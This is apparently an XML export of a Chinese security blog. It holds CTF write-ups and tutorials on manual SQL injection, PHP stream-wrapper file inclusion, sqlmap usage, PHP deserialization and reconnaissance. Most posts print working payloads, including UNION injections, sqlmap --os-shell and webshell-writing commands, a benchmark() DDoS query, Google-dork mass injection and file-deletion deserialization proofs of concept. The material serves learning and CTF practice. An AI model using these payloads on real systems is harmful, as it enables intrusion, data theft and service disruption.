?page=&#39;)%20or%20print_r(file_get_contents(&#39;templates%2fflag.php&#39;))%3b%23 payload2： &#39;,&#39;..&#39;)===False and system(&#39;cat templates/flag.php&#39;);// 总结通过这道题，了解到了GitHack，了解到了git泄露，美滋滋！！！]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之手工注入]]></title>
    <url>%2F2019%2F04%2F01%2Fsql-zhu-ru-zhi-shou-gong-zhu-ru%2F</url>
    <content type="text"><![CDATA[前言手工注入虽然原理是一样的，但是在具体手工注入的过程中有好多各种各样的细节不太一样，特此记录汇总下，以方便以后的学习查询。 步骤注释或闭合语句首先看下一个基本的SQL语句查询源码： $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; 下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。 引导闭合语句id =1 &#39; and &#39;1&#39; =&#39;1 带入进源码中的SQL语句就是: SELECT * FROM users WHERE id=&#39;1 &#39; and &#39;1&#39; = &#39;1&#39; LIMIT 0,1 注释后面语句常用的注释payload： or 1=1--+ &#39;or 1=1--+ &quot;or 1=1--+ )or 1=1--+ &#39;)or 1=1--+ &quot;) or 1=1--+ &quot;))or 1=1--+ --+ 可以用#替换，url 提交过程中 Url 编码后的#为%23 带入进源码中的SQL语句就是: SELECT * FROM users WHERE id=&#39;&#39;or 1=1--+&#39; LIMIT 0,1 这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。 and验证当然这里 and 验证和 or 验证都可以，二者区别不大: 页面返回正常 ?id=1&#39; and 1=1 --+ ?id=1&#39; or 1=2 --+ 页面返回异常 ?id=1&#39; and 1=2 --+ ?id=1&#39; or 1=1 --+ 如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。 查询字段数目查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。 ?id=1&#39; order by 1 –-+ 此时页面正常，继续换更大的数字测试 ?id=1&#39; order by 10 –-+ 此时页面返回错误，更换小的数字测试 ?id=1&#39; order by 5 –-+ 此时页面依然报错，继续缩小数值测试 ?id=1&#39; order by 3 –-+ 此时页面返回正常，更换大的数字测试 ?id=1&#39; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3 通过数学的对半查找，确定字段数目。 联合查询UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。因为字段数目是:3,那么正规的语句如下: ?id=1&#39; UNION SELECT 1,2,3 --+ 这里页面是不会报错的，此时我们带入数据库的语句为: SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段： id=-1&#39; UNION SELECT 1,2,3 –-+ 通过id=-1 一个负数不存在的id值来触发报错 id=1&#39; and 1=2 UNION SELECT 1,2,3 –-+ 通过and 1=2 语句来触发报错 id=1&#39; or 1=1 UNION SELECT 1,2,3 –-+ 通过or 1=1 语句来触发报错 收集信息在爆出的字段值里面可以替换为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息: MySQL常用的系统函数: version() #MySQL版本 user() #数据库用户名 database() #数据库名 @@datadir #数据库路径 @@version_compile_os #操作系统版本 查询当前数据库名 id=1&#39; and 1=2 UNION SELECT 1,database(),3 --+ 查询MySQL版本 id=1&#39; and 1=2 UNION SELECT 1,2,version() --+ 查询数据库用户和路径 id=1&#39; and 1=2 UNION SELECT 1,user(),@@datadir --+ 查询数据库查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。 查询当前数据库 id=1&#39; and 1=2 UNION SELECT 1,2,database() --+ 拿到当前的数据库名称为:security 查询所有数据库有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库: id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+ 查询表名database 查询数据库 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 单引号-数据库这里的database()函数进行了数据库查询，因为我们已经查到了当前的数据库为security，所有这里还可以酱紫写，用单引号括把数据库的名称括起来&#39;security&#39;: id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+hex编码数据库如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行hex编码处理。使用火狐自带的HackBar插件可以快速的进行hex编码: hex编码后在前面加上0x表明这里是16进制编码。 查询列名目前收集到的信息为: 数据库名称: securuty 数据库表名: emails,referers,uagents,users 这几个表中 一般我们都会去 继续猜解users表。 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+ 查询字段值知道了数据库、表名、各个字段名可以直接进行查询了，不需借助information_schanem数据库了。 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+ 简单整理order by –-+ 判断字段数目 union select –-+ 联合查询收集信息 id=1&#39; and 1=2 UNION SELECT 1,2,database() –-+ 查询当前数据库 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –-+查询所有数据库 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –-+ 查询表名 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –-+ 查询列名 id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users –-+ 查询字段值]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php伪协议]]></title>
    <url>%2F2019%2F03%2F30%2Fphp-wei-xie-yi%2F</url>
    <content type="text"><![CDATA[前言PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 今天着重研究php:// 有两个比较重要的配置在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。 php伪协议php://inputphp://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。 使用条件：include()、include_once()、file_get_contents() 比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。 php://outputphp://output 是一个只写的数据流，允许你以 print 和 echo 一样的方式写入到输出缓冲区。 php://filter(重点)这篇文章的关键在于讨论php://filter,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 事实上，在include函数的使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。 URL中包含点的常见形式 ?file = xxx 或者 ?file = xxx.php 那么源码中的写法： include($file.&#39;php&#39;) 或者 include($file) 这里直接使用伪协议包含： ?file=php://filter/read=convert.base64-encode/resource=login ?action = xxx &amp; mode = xxx 这里形式就是文件夹加上文件名的方法 http://www.example.com/index.php?action=front&amp;mode=login 那么源码中的写法： include($action.&#39;/&#39;.$mode.&#39;.php&#39;); 那么对于这种情况使用的伪协议包含形式： ?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login 举个例子题目链接：http://level3.tasteless.en/ 题目直接给出了源码： &lt;?php highlight_file(&#39;index.php&#39;); /* view file: php.ini so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found. so there will be something in it which enables you to solve this level, wont? always be UP TO DATE! hint enough, might just take you seconds to do?! */ error_reporting(0); include(&#39;anti_rfi.php&#39;); //rfi is forbidden!!!!! $inc = @$_GET[&#39;file&#39;]; @require_once($inc); ?&gt; 用php://input直接就能执行任意代码 绕过waf的方法在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。 ?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read） ?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php（正则 /resource=*.jpg/i） ?f=data:text/plain,&lt;?php phpinfo()?&gt; ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 截断包含截断这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件： php版本小于5.3.4 magic_quotes_gpc为off ./ 截断点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。 具体可以看下面的文章：https://blog.csdn.net/zvall/article/details/8951925 zip协议和phar协议在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。 phar://、zip://，都可以看到在phpinfo中有相应的描述。 例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。 zip://..（当前脚本的绝对路径）.../1.jpg#1.php phar://...（当前脚本的绝对路径）.../1.jpg/1（分割不加后缀名）]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap的基本使用]]></title>
    <url>%2F2019%2F03%2F29%2Fsqlmap-de-ji-ben-shi-yong%2F</url>
    <content type="text"><![CDATA[前言sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。 一共有11种常见SQLmap使用方法：SQLmap用于Access数据库注入 猜解是否能注入python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; 猜解表python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin 根据字段猜解内容(假如通过3得到字段为username和password)python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; SQLMAP用于Cookie注入 cookie注入，猜解表python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 猜解字段，(通过1的表猜解字段，假如表为admin)python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2 猜解内容python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T admin -C &quot;username,password&quot; --level 2 SQLMAP用于mysql中DDOS攻击 获取一个Shellpython sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell 输入执行语句完成DDOS攻击select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) SQLMAP用于mysql注入 查找数据库python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs 通过第一步的数据库查找表(假如数据库名为dataname)python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables 通过2中的表得出列名(假如表为table_name)python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns 获取字段的值(假如扫描出id,user,password字段)python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump SQLMAP中post登陆框注入其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp 几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass 自动的搜索sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms 指定参数搜索sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot; SQLMAP中Google搜索注入inurl后面的语言是由自己定的注入过程中如果选y是注入，如果不是选n sqlmap -g inurl:php?id= SQLMAP中的请求延迟参数 –delay –safe-freq python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3 SQLMAP绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=1 sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot; space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py都是编码方式 SQLMAP查看权限sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges SQLMAP伪静态注入 查找数据库python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables 通过2中的数据表得到字段(假如得到的是tablename表)python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T tablename --columns 通过3得到字段值(假如从3中得到字段id，password)python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T tablename -C &quot;password&quot; --dump SQLMAP注入点执行命令与交互写shell 注入点：http://192.168.159.1/news.php?id=1此处采用的是Linux系统sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig出现语言的选择根据实际的测试网站选择语言指定目标站点D:/www/ 获取Shellsqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell出现语言的选择根据实际的测试网站选择语言指定目标站点D:/www/输入ipconfig/all创建用户和删除用户只要权限足够大，你可以输入使用任何命令。其他命令参考下面：从数据库中搜索字段sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件 首先找需要网站的物理路径，其次需要有可写或可读权限。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 示例：sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令：sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录：“E:\php\htdocs\dvwa” 注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令： -is-dba 当前用户权限（是否为root权限） -dbs 所有数据库 -current-db 网站当前数据库 -users 所有数据库用户 -current-user 当前数据库用户 -random-agent 构造随机user-agent -passwords 数据库密码 -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php序列化与反序列化]]></title>
    <url>%2F2019%2F03%2F27%2Fphp-xu-lie-hua-yu-fan-xu-lie-hua%2F</url>
    <content type="text"><![CDATA[前言最近在总结php序列化相关的知识，看了好多网上的文章，现在将自己的理解记录下来。 php序列化与反序列化基础序列化与反序列化 序列化是将变量转换为可保存或可传输的字符串的过程。 反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。 php序列化与反序列化函数 serialize():可以将变量转换为字符串并且在转换中可以保存当前变量的值。 unserialize():可以将serialize()生成的字符串转化为变量。 php进行序列化的目的就是保存一个对象方便以后重用。 php序列化实例&lt;?php class Person { // 变量 public $name = &#39;&#39;; public $age = 0; public function Information() { echo &#39;Person:&#39;.$this-&gt;name.&#39;is&#39;.$this-&gt;age.&#39;years old.&lt;br/&gt;&#39;; } } $per = new Person(); $per -&gt; name = &#39;Lv&#39;; $per -&gt; age = 18; echo serialize($per); ?&gt; 运行结果：O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:2:&quot;Lv&quot;;s:3:&quot;age&quot;;i:18;}这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称，之后的类似。 serialize():序列化一个对象将会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。 php反序列化实例&lt;?php class Person { // 变量 public $name = &#39;&#39;; public $age = 0; // 方法 public function Information() { echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39; years old.&lt;br/&gt;&#39;; } } // 反序列化实例 $per = unserialize(&#39;O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:2:&quot;Lv&quot;;s:3:&quot;age&quot;;i:18;}&#39;); print_r($per); ?&gt; 运行结果： Person Object ( [name] =&gt; Lv [age] =&gt; 18 ) unserialize():unserialize()一个对象，这个对象的类必须已经定义过。 php魔法函数php类中包含了一些魔法函数，这些函数可以在脚本的任何地方不用声明就可以使用。 __construct() // 当一个对象创建时被调用 __destruct() // 对象被销毁时触发 __wakeup() // 使用unserialize时触发 __sleep() // 使用serialize时触发 __toString() // 把类当作字符串使用时触发 __get() // 用于从不可访问的属性读取数据 反序列化漏洞由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 下面是我在本地搭建的环境。 php反序列化漏洞demo1 test1.php: &lt;?php class delete { public $filename = &#39;error&#39;; function __destruct() { echo $this-&gt;filename.&#39; was deleted!&#39;; unlink(dirname(__FILE__).&#39;/&#39;.$this-&gt;filename); } // unlink()函数执行删除文件操作 } 在test1.php中可以看到，delete类中定义了一个__destruct()函数，该函数中会执行删除文件的操作。如果我们想利用该类来执行任意文件的删除操作，则需要寻找到一个可控的unserialize()函数 test2.php: &lt;?php include &#39;test1.php&#39;; class Person { public $name = &#39;&#39;; public $age = 18; public function Information() { echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39;years old&#39;; } } $per = unserialize($_GET[&#39;per_serialized&#39;]); ?&gt; 在test2.php中包含了test1.php,并且我们可以看到$per = unserialize($_GET[&#39;per_serialized&#39;]);,其中per_serialized是可控的。 如果我们已经知道在该目录下有一个1.txt文件，如果我们想要删除这个文件，则可以这样构造poc： &lt;?php class delete { public $filename = &#39;error&#39;; } $test = new delete(); $test-&gt;filename = &#39;1.txt&#39;; //filename的值就是我们想要删除的文件名 echo serialize($test); //序列化输出 ?&gt; 可以得到payload为：O:6:&quot;delete&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}。 访问：http://127.0.0.1/test2.php?per_serialized=O:6:%22delete%22:1:{s:8:%22filename%22;s:5:%221.txt%22;} 访问：http://127.0.0.1/1.txt php反序列化漏洞demo2 test4.php: &lt;?php class read { public $filename = &#39;error&#39;; function __toString() { //file_get_contents()函数把整个文件一次性读入一个字符串中 return file_get_contents($this-&gt;filename); } } ?&gt; 在test4.php中可以看到，类中定义了一个__toString()函数，该函数可以返回一个文件内容。如果我们想利用该类来读取任意文件，不仅需要寻找一个可利用的unserialize,还要有一个触发toString()函数的条件。 test5.php &lt;?php include &#39;test4.php&#39;; class Person { public $name = &#39;&#39;; public $age = 18; public function Information() { echo &#39;Person:&#39;.$this-&gt;name.&#39; is &#39;.$this-&gt;age.&#39;years old&#39;; } } $per = unserialize($__GET[&#39;per_serialized&#39;]); echo $per; ?&gt; 在test5.php中，包含了test4.php。可以看到$per = unserialize($__GET[&#39;per_serialized&#39;]);，其中per_serialized可控。echo $per;会触发__toString()函数 构造poc，得到payload： &lt;?php class read { public $filename = &#39;error&#39;; } $test = new read(); $test -&gt; filename = &#39;2.txt&#39;; echo serialize($test); ?&gt; payload:O:4:&quot;read&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;} 访问：http://127.0.0.1/2.txt 访问：http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;} 总结通过上面的学习，我们知道，要想找到一个php漏洞，需要先找到可控的反序列化函数，通过这些反序列化函数，我们去调用一些类，这些类中可能会包含一些魔法函数，在这些魔法函数中可能会有一些我们可控的危险操作，从而触发了php反序列化漏洞。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web渗透测试-信息收集总结]]></title>
    <url>%2F2019%2F03%2F23%2Fweb-shen-tou-ce-shi-xin-xi-shou-ji-zong-jie%2F</url>
    <content type="text"><![CDATA[0x00 前言信息收集分为：被动信息收集和主动信息收集。 被动信息收集不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集。 主动信息收集和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。 没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会相对较少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。 0x01 信息收集DNS域名信息收集我们需要收集域名对应的 ip，域名注册人、DNS记录、子域名等等一系列与域名相关的信息。扫描域名信息的工具由很多，比如：Whois、DIG、Layer、Dnsenum、dnsmap、Fierce、Dmitry、Maltego等等传送门： DNS域名探测工具的使用whois、DIG、Layer、dnsenum 在线子域名查询地址：https://phpinfo.me/domain/ 操作系统类型服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。 判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。 可以使用nmap的“-O”参数，来初步判断服务器系统类型： 大小写访问网站： http://www.xxx.com/index.html http://www.xxx.com/inDex.html Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。 网站容器(Apache/Nginx/Tomcat/IIS)知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。 探测网站是哪种web服务器，可以使用工具 whatweb 。 传送门：网站指纹识别工具Whatweb的使用 脚本类型(php/jsp/asp/aspx)我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。 可以根据网站URL来判断 site:xxx filetype:php 可以根据Firefox的插件来判断 数据库类型(Mysql/Oracle/Accees/Mqlserver)我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的. 主机扫描(AWVS、Nessus)对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。 传送门：AWVS的基本使用Nessus扫描器的使用 CMS类型 robots.txt文件 从wp路径可以看出这个是WordPress的cms 通过版权信息进行查询一般直接拉到底部查看版权信息，有些站点会显示出来 通过查看网页源码的方式 旁站和C段扫描旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！ C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。旁站和C段在线查询地址：http://www.webscan.cc/http://www.5kik.com/ 在线查询网站https://phpinfo.me/bing.php 站长之家http://tool.chinaz.com/ 开放端口nmap扫描nmap -F -sT -v -n 45.33.49.119-120]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF之web总结]]></title>
    <url>%2F2019%2F03%2F20%2Fctf-zhi-web-zong-jie%2F</url>
    <content type="text"><![CDATA[0x00 前言&#160; &#160; &#160; 身为一只web小白，但也刷了不少CTF方面的web题，趁着今天有时间，坐下来总结一下关于web的解题方法。 0x01 直接查看源代码题目：http://ctf5.shiyanbar.com/10/main.php解题方法：点击右键，查看页面源代码将hidden改为text,value=0改为value=1,点击Enter。出现下图：这段代码的意思就是，将我们传给PIN的值给a,如果a=-19827747736161128312837161661727773716166727272616149001823847,输出flag。因此，我们直接将该值输入进去，点击Enter即可。 0x02 查看修改或添加HTTP请求头响应头题目：http://ctf5.shiyanbar.com/phpaudit/解题方法：点击View the source code,从这段代码可以看出，只要IP为1.1.1.1,即可输出flag。用burpsuite抓包,在请求头中添加X-Forwarded-For:1.1.1.1,然后GO即可， 0x03 302跳转的中转网页有信息题目：解题方法：0x04 查看开发者工具控制台题目：http://ctf5.shiyanbar.com/DUTCTF/1.html解题方法：进去之后发现是一片乱字符，其实不难发现这是js代码，这就可以用到我们的控制台了，复制代码，按F12，回车 0x05 js代码，js加解密题目：解题方法：0x06 使用Burpsuite拦截题目：http://ctf5.shiyanbar.com/basic/catch/解题方法：在输入框中随便输入123，发现报错，然后尝试抓包，发现响应头返回一个字符串MTU1MzA5MzkzOA==然后将该字符串提交，即得flag。 其实该字符串是经过base64加密的,解密后是1553093938 0x07 robots.txt题目：解题方法：0x08 asp,php代码审计题目一：http://ctf5.shiyanbar.com/web/more.php解题方法：点击查看源代码， &lt;?php if (isset ($_GET[&#39;password&#39;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE) { echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;; } else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) { if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) { die(&#39;Flag: &#39; . $flag); } else { echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;); } } else { echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;; } } ?&gt; 从这段代码中，可以看出要想得到flag，必须满足以下几个条件： 输入的password必须是“a-zA-Z0-9]+$”中的 password必须长度小于8 password的值必须大于999999999 password必须包含字符串*-* &#160; &#160; &#160; 对于前三个条件，我们可以用科学计数法password=9e9,最后一个条件，其实ereg()函数有一个截断漏洞，我们可以用%00截断，让password=9e9%00*-*。在提交password的时候我们发现并不会出现flag，这是因为浏览器修改了传进去的参数，我们直接在url后面传参即可。 题目二：http://ctf5.shiyanbar.com/DUTCTF/index.php解题方法：出来这么一句话，查看源代码，源代码简单的不能再简单了。 但我们发现了这么一个文件index.php.txt,二话不说放进url试试，哎，出现了php源代码 &lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &#160; &#160; &#160; 